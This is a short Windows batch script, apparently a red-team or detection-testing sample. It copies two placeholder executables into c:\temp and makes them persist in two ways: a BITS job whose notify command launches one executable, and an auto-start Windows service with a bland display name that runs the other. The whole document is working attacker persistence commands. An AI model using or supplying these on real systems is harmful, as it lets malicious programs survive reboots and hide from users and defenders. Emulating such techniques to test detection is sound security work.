mkdir c:\temp
copy bad1111.exe c:\temp
copy bad2222.exe c:\temp

REM bitsadmin persistance
bitsadmin /rawreturn /reset
bitsadmin /rawreturn /create TEST
bitsadmin /rawreturn /addfile TEST c:\windows\system32\user32.dll c:\users\public\documents\user32.gif
bitsadmin /rawreturn /setnotifycmdline TEST c:\temp\bad1111.exe NULL
bitsadmin /rawreturn /setpriority TEST high
bitsadmin /rawreturn /resume TEST

REM service persistence
sc delete TEST
sc create TEST binpath= c:\temp\bad2222.exe error= ignore start= auto DisplayName= blark
sc description TEST blark
sc start TEST
